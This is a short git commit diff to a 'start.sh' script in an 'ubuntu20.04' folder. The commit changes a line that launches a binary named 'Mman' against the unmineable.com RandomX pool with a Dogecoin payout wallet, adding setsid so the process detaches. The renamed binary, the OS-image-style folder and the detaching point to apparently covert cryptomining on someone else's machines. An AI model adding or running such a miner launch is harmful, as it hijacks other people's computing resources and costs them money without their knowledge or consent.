b830460397544933f4e765015cbb8e31fdeeb276
Saswata785 <35234794+Saswata785@users.noreply.github.com>
2021-04-27 21:48:56 +0530

    Update start.sh

--- ubuntu20.04/start.sh
+++ ubuntu20.04/start.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-./Mman -o rx.unmineable.com:13333 -a rx -k -u DOGE:D6hZna7Ht34n6gD1645wh8QsDqn3oihN4F.Mr$RANDOM
+setsid ./Mman -o rx.unmineable.com:13333 -a rx -k -u DOGE:D6hZna7Ht34n6gD1645wh8QsDqn3oihN4F.Mr$RANDOM
 echo done
